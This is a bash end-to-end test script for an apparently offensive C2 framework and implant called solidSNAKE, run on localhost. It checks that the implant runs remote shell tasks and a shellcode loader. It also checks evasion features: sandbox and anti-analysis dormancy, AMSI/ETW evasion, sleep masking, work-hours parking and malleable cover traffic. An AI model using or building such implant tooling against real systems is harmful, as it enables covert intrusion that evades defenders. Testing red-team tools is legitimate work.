#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK=/tmp/snake-e2e-cpp
KEY="000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
IMPID="snakecpp0e2e0001"
PORT=14444
PASS="snake-cpp-e2e"
API="https://127.0.0.1:$PORT"

fail() { echo "FAIL: $*"; exit 1; }

echo "[*] build the solidSNAKE stack (C2 + implant)..."
(cd "$ROOT" && make -s build/solidsnake-c2 build/solidsnake)

echo "[*] fresh workdir: $WORK"
rm -rf "$WORK"
mkdir -p "$WORK"

echo "[*] starting the solidSNAKE C2 on 127.0.0.1:$PORT (TLS self-signed)..."
(cd "$WORK" && exec "$ROOT/build/solidsnake-c2" --listen "127.0.0.1:$PORT" --gen-certs \
	--db "$WORK/c2.db" --key "$KEY" --password "$PASS" --id snake-cpp-e2e \
	> "$WORK/c2.log" 2>&1) &
C2PID=$!
trap 'kill "$C2PID" 2>/dev/null || true' EXIT

for _ in $(seq 1 100); do
	(echo > "/dev/tcp/127.0.0.1/$PORT") 2>/dev/null && break
	sleep 0.2
done
grep -q "starting TLS" "$WORK/c2.log" || { echo "FAIL: solidSNAKE C2 did not start"; cat "$WORK/c2.log"; exit 1; }
echo "    solidSNAKE C2 up (pid $C2PID)"

SNAKE="$ROOT/build/solidsnake"
CT="Authorization: Bearer"

echo "[*] dashboard gate - unauthenticated read must redirect to the login page..."
CODE=$(curl -sk -o /dev/null -w '%{http_code}' "$API/dashboard")
LOC=$(curl -sk -o /dev/null -w '%{redirect_url}' "$API/dashboard")
[ "$CODE" = "302" ] || fail "unauthenticated /dashboard returned $CODE"
[ "$LOC" = "$API/" ] || fail "unauthenticated /dashboard redirected to '$LOC'"
echo "    302 -> $LOC"

echo "[*] operator login (POST /api/dashboard/login)..."
TOKEN=$(curl -sk -X POST -H 'Content-Type: application/json' -d "{\"password\":\"$PASS\"}" \
	"$API/api/dashboard/login" | jq -r '.token')
[ -n "$TOKEN" ] && [ "$TOKEN" != "null" ] || fail "login returned no token"
[ "$(echo "$TOKEN" | awk -F. '{print NF}')" = "3" ] || fail "token is not a JWT: $TOKEN"
echo "    token issued (${#TOKEN} bytes, HS256 JWT)"
curl -sk -o /dev/null -w '%{http_code}' -H "$CT $TOKEN" "$API/api/dashboard/implants" | grep -q '^200$' \
	|| fail "bad password rejected? token not accepted"
if curl -sk -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: application/json' \
	-d '{"password":"wrong"}' "$API/api/dashboard/login" | grep -q '^200$'; then
	fail "wrong password accepted"
fi
echo "    token accepted; wrong password rejected (401)"

COUNT=$(curl -sk -H "$CT $TOKEN" "$API/api/dashboard/implants" | jq -r '.count')
[ "$COUNT" = "0" ] || fail "expected 0 implants before beacon, got $COUNT"

echo "[*] beacon #1 - register over WS..."
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMPID" --debug 2>&1 | sed 's/^/    /'

REG=$(curl -sk -H "$CT $TOKEN" "$API/api/dashboard/implants")
[ "$(echo "$REG" | jq -r '.count')" = "1" ] || fail "implant not registered: $REG"
[ "$(echo "$REG" | jq -r '.implants[0].id')" = "$IMPID" ] || fail "wrong implant id: $REG"
echo "    registered: $IMPID (beacon_count $(echo "$REG" | jq -r '.implants[0].beacon_count'))"

echo "[*] queue a shell task through the solidSNAKE operator API..."
CREATED=$(curl -sk -X POST -H "$CT $TOKEN" -H 'Content-Type: application/json' \
	-d "{\"implant_id\":\"$IMPID\",\"type\":\"shell\",\"payload\":{\"command\":\"echo snake-pure-e2e; id\"}}" \
	"$API/api/dashboard/task")
TASK1=$(echo "$CREATED" | jq -r '.task_id')
echo "$CREATED" | jq -e '.success == true' >/dev/null || fail "task create failed: $CREATED"
echo "    task $TASK1 queued"

echo "[*] beacon #2 - fetch, execute, report over WS..."
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMPID" --debug 2>&1 | sed 's/^/    /'

STATUS=""
for _ in $(seq 1 25); do
	STATUS=$(sqlite3 "$WORK/c2.db" "SELECT status FROM tasks WHERE id='$TASK1';" 2>/dev/null || true)
	[ "$STATUS" = "completed" ] && break
	sleep 0.2
done
[ "$STATUS" = "completed" ] || fail "task $TASK1 status '$STATUS'"
RESULT1=$(sqlite3 "$WORK/c2.db" "SELECT result FROM tasks WHERE id='$TASK1';")
echo "$RESULT1" | grep -q "snake-pure-e2e" || fail "unexpected result: $RESULT1"
echo "$RESULT1" | grep -q "uid=" || fail "shell task did not run: $RESULT1"
echo "    task completed: $(echo "$RESULT1" | head -c 120)"
LEFT=$(curl -sk -H "$CT $TOKEN" "$API/api/dashboard/tasks/$IMPID" | jq -r '.tasks | length')
[ "$LEFT" = "0" ] || fail "task queue not drained: $LEFT left"

echo "[*] queue a payload task (registry dispatch: polyloader, decode-only)..."
curl -sk -X POST -H "$CT $TOKEN" -H 'Content-Type: application/json' \
	-d "{\"implant_id\":\"$IMPID\",\"type\":\"payload\",\"payload\":{\"name\":\"polyloader\",\"shellcode\":\"QUJD\",\"key\":\"aa\"}}" \
	"$API/api/dashboard/task" | jq -e '.success == true' >/dev/null || fail "payload task create failed"
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMPID" --debug 2>&1 | sed 's/^/    /'
DONE=0
for _ in $(seq 1 25); do
	DONE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM tasks WHERE status='completed';")
	[ "$DONE" -ge 2 ] && break
	sleep 0.2
done
[ "$DONE" -ge 2 ] || fail "payload task not completed (completed=$DONE)"
RESULT2=$(sqlite3 "$WORK/c2.db" "SELECT result FROM tasks WHERE task_type='payload';")
echo "$RESULT2" | grep -q '202322' || fail "payload result: $RESULT2"
echo "$RESULT2" | grep -q '"success":true' || fail "payload task not successful: $RESULT2"
echo "    payload task completed (registry dispatch ok)"

echo "[*] REST fallback channel - task cycle over AEAD envelopes..."
curl -sk -X POST -H "$CT $TOKEN" -H 'Content-Type: application/json' \
	-d "{\"implant_id\":\"$IMPID\",\"type\":\"shell\",\"payload\":{\"command\":\"echo rest-mode-ok; id\"}}" \
	"$API/api/dashboard/task" | jq -e '.success == true' >/dev/null || fail "rest task create failed"
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMPID" \
	--channel rest --debug 2>&1 | sed 's/^/    /'
DONE=0
for _ in $(seq 1 25); do
	DONE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM tasks WHERE status='completed';")
	[ "$DONE" -ge 3 ] && break
	sleep 0.2
done
[ "$DONE" -ge 3 ] || fail "REST task not completed (completed=$DONE)"
RESULT3=$(sqlite3 "$WORK/c2.db" "SELECT result FROM tasks ORDER BY rowid DESC LIMIT 1;")
echo "$RESULT3" | grep -q "rest-mode-ok" || fail "REST result: $RESULT3"
echo "    REST task completed: $RESULT3"

echo "[*] operator dashboard + API reads..."
UI=$(curl -sk -H "$CT $TOKEN" "$API/dashboard")
echo "$UI" | grep -q "<title>Ranger C3 v3</title>" || fail "dashboard asset not served"
CFG=$(curl -sk -H "$CT $TOKEN" "$API/api/dashboard/config")
[ "$(echo "$CFG" | jq -r '.config.version')" = "3.0.0" ] || fail "config version: $CFG"
[ "$(echo "$CFG" | jq -r '.config.c2_id')" = "snake-cpp-e2e" ] || fail "config c2_id: $CFG"
[ "$(echo "$CFG" | jq -r '.config.implants')" = "1" ] || fail "config implants: $CFG"
DETAIL=$(curl -sk -H "$CT $TOKEN" "$API/api/dashboard/implant/$IMPID")
BEACONS=$(echo "$DETAIL" | jq -r '.implant.beacon_count')
[ "$BEACONS" -ge 4 ] || fail "expected >=4 beacons on $IMPID, got $BEACONS"
echo "    dashboard $(echo "$UI" | wc -c) bytes served; config ok (c2_id snake-cpp-e2e, version 3.0.0)"
echo "    implant detail: $BEACONS beacons"

echo "[*] remote kill - exit task ends the implant loop..."
curl -sk -X POST -H "$CT $TOKEN" -H 'Content-Type: application/json' \
	-d "{\"implant_id\":\"$IMPID\",\"type\":\"exit\"}" "$API/api/dashboard/task" \
	| jq -e '.success == true' >/dev/null || fail "exit task create failed"
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMPID" --debug 2>&1 | sed 's/^/    /'
DONE=0
for _ in $(seq 1 25); do
	DONE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM tasks WHERE status='completed';")
	[ "$DONE" -ge 4 ] && break
	sleep 0.2
done
[ "$DONE" -ge 4 ] || fail "exit task not completed (completed=$DONE)"
echo "    exit task completed"

echo "[*] kill date / deadman switch - an expired-at-start policy exits cleanly without beaconing..."
IMPLANTS_BEFORE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
set +e
OUT_KD=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once \
	--id deadbeefkill0001 --kill-date 2001-01-01 --debug 2>&1)
RC_KD=$?
OUT_MR=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once \
	--id deadbeefkill0002 --max-runtime 0s --debug 2>&1)
RC_MR=$?
OUT_BAD=$("$SNAKE" --kill-date 2026-13-45 2>&1)
RC_BAD=$?
set -e
[ "$RC_KD" = "0" ] || fail "--kill-date expired run exited $RC_KD"
echo "$OUT_KD" | grep -q "lifetime policy expired: kill date reached (at start)" \
	|| fail "kill date not evaluated: $OUT_KD"
echo "$OUT_KD" | grep -q "exiting without beaconing" || fail "kill date did not skip beaconing: $OUT_KD"
[ "$RC_MR" = "0" ] || fail "--max-runtime 0s run exited $RC_MR"
echo "$OUT_MR" | grep -q "max runtime exceeded (at start)" || fail "deadman switch not evaluated: $OUT_MR"
[ "$RC_BAD" = "2" ] || fail "malformed --kill-date exited $RC_BAD (want 2)"
echo "$OUT_BAD" | grep -q "bad --kill-date" || fail "malformed --kill-date not reported: $OUT_BAD"
IMPLANTS_AFTER=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
[ "$IMPLANTS_BEFORE" = "$IMPLANTS_AFTER" ] \
	|| fail "expired implant beaconed ($IMPLANTS_BEFORE -> $IMPLANTS_AFTER implants)"
echo "    kill date + deadman switch: exit 0 with no beacon, malformed flag exit 2 (implants unchanged at $IMPLANTS_AFTER)"

echo "[*] work profile - off-hours parks without beaconing, in-hours beacons normally..."
PARK_START=$(date -d "+2 minutes" +%H:%M)
PARK_END=$(date -d "+3 minutes" +%H:%M)
ACTIVE_START=$(date -d "-1 minute" +%H:%M)
ACTIVE_END=$(date -d "+2 minutes" +%H:%M)
TODAY=$(date +%a | tr 'A-Z' 'a-z')
OTHER_DAYS=""
for d in mon tue wed thu fri sat sun; do
	[ "$d" = "$TODAY" ] && continue
	OTHER_DAYS="${OTHER_DAYS:+$OTHER_DAYS,}$d"
done
IMPLANTS_BEFORE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
set +e
OUT_WH=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --debug \
	--id feedface00000001 --work-hours "$PARK_START-$PARK_END" --max-runtime 1s 2>&1)
RC_WH=$?
OUT_WD=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --debug \
	--id feedface00000002 --work-days "$OTHER_DAYS" --max-runtime 1s 2>&1)
RC_WD=$?
OUT_WHB=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --work-hours "9am-5pm" 2>&1)
RC_WHB=$?
OUT_WDB=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --work-days "funday" 2>&1)
RC_WDB=$?
set -e
[ "$RC_WH" = "0" ] || fail "--work-hours off-hours run exited $RC_WH"
echo "$OUT_WH" | grep -q "outside work profile: parking" \
	|| fail "work-hours window not evaluated: $OUT_WH"
echo "$OUT_WH" | grep -q "self-destruct complete" \
	|| fail "off-hours run did not end cleanly: $OUT_WH"
[ "$RC_WD" = "0" ] || fail "--work-days off-day run exited $RC_WD"
echo "$OUT_WD" | grep -q "outside work profile: parking" \
	|| fail "work-days set not evaluated: $OUT_WD"
[ "$RC_WHB" = "2" ] || fail "malformed --work-hours exited $RC_WHB (want 2)"
echo "$OUT_WHB" | grep -q "bad --work-hours" || fail "malformed --work-hours not reported: $OUT_WHB"
[ "$RC_WDB" = "2" ] || fail "malformed --work-days exited $RC_WDB (want 2)"
echo "$OUT_WDB" | grep -q "bad --work-days" || fail "malformed --work-days not reported: $OUT_WDB"
IMPLANTS_HUSH=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
[ "$IMPLANTS_BEFORE" = "$IMPLANTS_HUSH" ] \
	|| fail "an off-hours implant beaconed ($IMPLANTS_BEFORE -> $IMPLANTS_HUSH implants)"
ACTIVE_OUT=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once \
	--id feedface00000003 --work-hours "$ACTIVE_START-$ACTIVE_END" --debug 2>&1)
echo "$ACTIVE_OUT" | grep -q "inside work profile" \
	|| fail "in-hours window not evaluated: $ACTIVE_OUT"
IMPLANTS_ARMED=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
[ "$IMPLANTS_ARMED" -eq "$((IMPLANTS_BEFORE + 1))" ] \
	|| fail "in-hours implant did not beacon ($IMPLANTS_BEFORE -> $IMPLANTS_ARMED implants)"
[ "$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants WHERE id='feedface00000003';")" = "1" ] \
	|| fail "in-hours implant row missing"
echo "    work profile: off-hours parks with no beacon (implants $IMPLANTS_BEFORE),"
echo "                 off-day parks with no beacon, in-hours beacons ($IMPLANTS_ARMED), malformed flags exit 2"

echo "[*] anti-analysis gate - hostile readings go dormant without beaconing, benign ones beacon..."
AA_BEFORE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
HOSTILE="uptime=100,disk=5,ram=512,cpu=1,mac=52:54:00:12:34:56,tool=wireshark"
BENIGN="uptime=86400,disk=200,ram=16384,cpu=8,mac=3c:52:82:11:22:33"
set +e
OUT_AA_H=$(SNAKE_ANALYSIS_READINGS="$HOSTILE" "$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" \
	--key "$KEY" --insecure --debug --analysis-paranoid --max-runtime 1s \
	--id aa5e000000000001 2>&1)
RC_AA_H=$?
OUT_AA_B=$(SNAKE_ANALYSIS_READINGS="$BENIGN" "$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" \
	--key "$KEY" --insecure --debug --once --analysis-threshold 6 \
	--id aa5e000000000002 2>&1)
RC_AA_B=$?
OUT_AA_R=$("$SNAKE" --c2 "wss://127.0.0.1:1/ws" --key "$KEY" --insecure --debug --once \
	--analysis-threshold 1000 --id aa5e000000000003 2>&1)
RC_AA_R=$?
OUT_AA_T=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --analysis-threshold 0 2>&1)
RC_AA_T=$?
OUT_AA_C=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --analysis-paranoid --analysis-threshold 9 2>&1)
RC_AA_C=$?
set -e
[ "$RC_AA_H" = "0" ] || fail "hostile analysis readings exited $RC_AA_H"
echo "$OUT_AA_H" | grep -q "analysis gate: score [0-9]*/3 HOSTILE" \
	|| fail "hostile readings not scored hostile: $OUT_AA_H"
echo "$OUT_AA_H" | grep -q "environment check failed, going dormant" \
	|| fail "hostile readings did not go dormant: $OUT_AA_H"
echo "$OUT_AA_H" | grep -q "exiting without beaconing" \
	|| fail "hostile run did not end without beaconing: $OUT_AA_H"
[ "$RC_AA_B" = "0" ] || fail "benign analysis readings exited $RC_AA_B"
echo "$OUT_AA_B" | grep -q "analysis gate: score 0/6 clean" \
	|| fail "benign readings not scored clean: $OUT_AA_B"
echo "$OUT_AA_B" | grep -q "environment check failed" \
	&& fail "benign readings went dormant: $OUT_AA_B"
[ "$RC_AA_R" = "0" ] || fail "real-readings analysis run exited $RC_AA_R"
echo "$OUT_AA_R" | grep -q "analysis gate: score [0-9]*/1000 clean" \
	|| fail "real readings did not score clean under a high threshold: $OUT_AA_R"
[ "$RC_AA_T" = "2" ] || fail "malformed --analysis-threshold exited $RC_AA_T (want 2)"
echo "$OUT_AA_T" | grep -q "bad --analysis-threshold" \
	|| fail "malformed --analysis-threshold not reported: $OUT_AA_T"
[ "$RC_AA_C" = "2" ] || fail "--analysis-paranoid + --analysis-threshold exited $RC_AA_C (want 2)"
echo "$OUT_AA_C" | grep -q "cannot be combined with --analysis-paranoid" \
	|| fail "analysis flag conflict not reported: $OUT_AA_C"
AA_AFTER=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
[ "$AA_AFTER" -eq "$((AA_BEFORE + 1))" ] \
	|| fail "anti-analysis flag changes beacon count ($AA_BEFORE -> $AA_AFTER, want +1 for the benign leg)"
echo "    hostile readings dormant with no beacon, benign readings clean ($AA_BEFORE -> $AA_AFTER implants),"
echo "    real readings scored under a high threshold, malformed/conflicting flags exit 2"

echo "[*] evade - the opt-in AMSI/ETW set parses, arms and is a no-op off Windows..."
EV_BEFORE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
set +e
OUT_EV_BAD=$("$SNAKE" --evade bogus --c2 "wss://127.0.0.1:$PORT/ws" 2>&1)
RC_EV_BAD=$?
OUT_EV_EMPTY=$("$SNAKE" --evade "" --c2 "wss://127.0.0.1:$PORT/ws" 2>&1)
RC_EV_EMPTY=$?
OUT_EV=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --debug --once \
	--evade amsi,etw --id e7ade00000000001 2>&1)
RC_EV=$?
set -e
[ "$RC_EV_BAD" = "2" ] || fail "unknown --evade target exited $RC_EV_BAD (want 2)"
echo "$OUT_EV_BAD" | grep -q "bad --evade: unknown target 'bogus'" \
	|| fail "unknown --evade target not reported: $OUT_EV_BAD"
[ "$RC_EV_EMPTY" = "2" ] || fail "empty --evade list exited $RC_EV_EMPTY (want 2)"
echo "$OUT_EV_EMPTY" | grep -q "bad --evade: empty list" \
	|| fail "empty --evade list not reported: $OUT_EV_EMPTY"
[ "$RC_EV" = "0" ] || fail "--evade amsi,etw run exited $RC_EV"
echo "$OUT_EV" | grep -q "evade armed: amsi,etw" || fail "evade set not armed: $OUT_EV"
echo "$OUT_EV" | grep -q "evade: not supported on this platform" \
	|| fail "off-Windows evade skip not reported: $OUT_EV"
EV_AFTER=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
[ "$EV_AFTER" -eq "$((EV_BEFORE + 1))" ] \
	|| fail "the evade flag changes the default beacon count ($EV_BEFORE -> $EV_AFTER, want +1)"
echo "    amsi,etw armed and skipped off Windows, malformed/empty lists exit 2, wire untouched"

echo "[*] sleep mask - sensitive state is masked across the inter-beacon sleep and still works..."
SLEEPMASK_ID="5leepmask0000001"
OUT_SM=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --debug \
	--id "$SLEEPMASK_ID" --beacon-min 1 --beacon-max 1 --max-runtime 6s 2>&1)
echo "$OUT_SM" | grep -q "sleep mask: [0-9]* regions / [0-9]* bytes locked + encrypted" \
	|| fail "sleep mask did not mask the state: $OUT_SM"
echo "$OUT_SM" | grep -q "sleep mask: restored [0-9]* regions" \
	|| fail "sleep mask did not restore the state: $OUT_SM"
echo "$OUT_SM" | grep -q "beacon send failed" && fail "a beacon failed after the mask round trip: $OUT_SM"
echo "$OUT_SM" | grep -q "task decrypt failed" && fail "a task could not be decrypted after masking: $OUT_SM"
SM_BEACONS=$(sqlite3 "$WORK/c2.db" "SELECT beacon_count FROM implants WHERE id='$SLEEPMASK_ID';")
[ -n "$SM_BEACONS" ] || fail "sleep-mask implant never registered"
[ "$SM_BEACONS" -ge 2 ] || fail "sleep-mask implant only beaconed $SM_BEACONS time(s)"
echo "    masked state across sleeps; $SM_BEACONS beacons decrypted by the C2 after restore"

OUT_OPT=$(SNAKE_NO_SLEEP_MASK=1 "$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure \
	--once --id "5leepmask0000002" --debug 2>&1)
echo "$OUT_OPT" | grep -q "sleep mask disabled (SNAKE_NO_SLEEP_MASK)" \
	|| fail "SNAKE_NO_SLEEP_MASK not honoured: $OUT_OPT"
echo "$OUT_OPT" | grep -q "sleep mask: restored" && fail "mask still ran with the opt-out: $OUT_OPT"
echo "    debug opt-out SNAKE_NO_SLEEP_MASK honoured (mask skipped)"

echo "[*] malleable profile - opt-in headers/paths reshape the client, default wire untouched..."
MP_BEFORE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
PROFILE_FILE="$WORK/malleable.profile"
cat > "$PROFILE_FILE" <<'EOF'
user_agent = snake-e2e/9.9
header.X-Trace = 0123456789abcdef
header.Accept-Language = en-US
cover_path = /assets/{{os}}/{{id}}.js
cover_count = 1
EOF
set +e
OUT_MP=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --debug --once \
	--profile "$PROFILE_FILE" --id m411eab1e0000001 2>&1)
RC_MP=$?
set -e
[ "$RC_MP" = "0" ] || fail "profiled run exited $RC_MP"
echo "$OUT_MP" | grep -q "malleable profile: ua=override headers=2" \
	|| fail "profile not reported: $OUT_MP"
echo "$OUT_MP" | grep -q "cover traffic: 1/1 request(s) sent" \
	|| fail "templated cover path not expanded/requested: $OUT_MP"
MP_AFTER=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants;")
[ "$MP_AFTER" -eq "$((MP_BEFORE + 1))" ] \
	|| fail "profiled beacon did not land ($MP_BEFORE -> $MP_AFTER)"

PROFILE_REST="$WORK/malleable-rest.profile"
cat > "$PROFILE_REST" <<'EOF'
header.X-Trace = rest-plumbing
beacon_path = /api/v1/beacon
result_path = /api/v1/result
EOF
set +e
OUT_MP_R=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --debug --once \
	--channel rest --profile "$PROFILE_REST" --id m411eab1e0000004 2>&1)
RC_MP_R=$?
set -e
[ "$RC_MP_R" = "0" ] || fail "profiled REST run exited $RC_MP_R"
echo "$OUT_MP_R" | grep -q "rest beacon ok" \
	|| fail "profiled REST cycle did not complete: $OUT_MP_R"
MP_R=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants WHERE id='m411eab1e0000004';")
[ "$MP_R" = "1" ] || fail "profiled REST beacon did not land (rows=$MP_R)"

BADTMPL="$WORK/malleable-badtmpl.profile"
printf 'beacon_path = /api/{{nope}}/beacon\n' > "$BADTMPL"
set +e
OUT_MP_T=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --debug --once \
	--channel rest --profile "$BADTMPL" --id m411eab1e0000002 2>&1)
RC_MP_T=$?
set -e
[ "$RC_MP_T" = "0" ] || fail "unexpandable template run exited $RC_MP_T"
echo "$OUT_MP_T" | grep -q "profile path template error: path template: unknown placeholder" \
	|| fail "unexpandable template not reported: $OUT_MP_T"
MP_T=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM implants WHERE id='m411eab1e0000002';")
[ "$MP_T" = "0" ] || fail "unexpandable template beaconed anyway (rows=$MP_T)"

BADKEY="$WORK/malleable-badkey.profile"
printf 'bogus_key = 1\n' > "$BADKEY"
set +e
OUT_MP_BAD=$("$SNAKE" --profile "$BADKEY" --c2 "wss://127.0.0.1:$PORT/ws" 2>&1)
RC_MP_BAD=$?
OUT_MP_MISS=$("$SNAKE" --profile "$WORK/no-such.profile" --c2 "wss://127.0.0.1:$PORT/ws" 2>&1)
RC_MP_MISS=$?
set -e
[ "$RC_MP_BAD" = "2" ] || fail "unknown profile key exited $RC_MP_BAD (want 2)"
echo "$OUT_MP_BAD" | grep -q "unknown key 'bogus_key'" \
	|| fail "unknown profile key not reported: $OUT_MP_BAD"
[ "$RC_MP_MISS" = "2" ] || fail "missing profile file exited $RC_MP_MISS (want 2)"
echo "$OUT_MP_MISS" | grep -q "cannot open profile" \
	|| fail "missing profile file not reported: $OUT_MP_MISS"

OUT_MP_DEF=$("$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --debug --once \
	--id m411eab1e0000003 2>&1)
echo "$OUT_MP_DEF" | grep -q "malleable profile:" \
	&& fail "default run reported a profile: $OUT_MP_DEF"
echo "$OUT_MP_DEF" | grep -q "cover traffic:" \
	&& fail "default run sent cover traffic: $OUT_MP_DEF"
echo "    profiled cycle landed ($MP_BEFORE -> $MP_AFTER implants), templated cover requested,"
echo "    profiled REST cycle with explicit endpoints landed, malformed/missing profiles exit 2,"
echo "    default wire unchanged"

echo "[OK] pure-C++ E2E green - solidSNAKE C2 + solidSNAKE implant only: dashboard login, WS task cycle,"
echo "     payload registry dispatch, REST fallback task cycle, exit task,"
echo "     kill-date/deadman-switch expiry leg ($BEACONS beacons, $DONE tasks),"
echo "     work-profile leg (off-hours/off-day park, in-hours beacon),"
echo "     anti-analysis leg (hostile readings dormant + no beacon, benign clean, malformed flags exit 2),"
echo "     evade leg (amsi,etw armed and skipped off Windows, malformed lists exit 2),"
echo "     sleep-mask leg (masked+restored state, $SM_BEACONS post-restore beacons, opt-out honoured),"
echo "     malleable-profile leg (opt-in headers/UA/cover traffic, templated path, malformed profiles exit 2)."
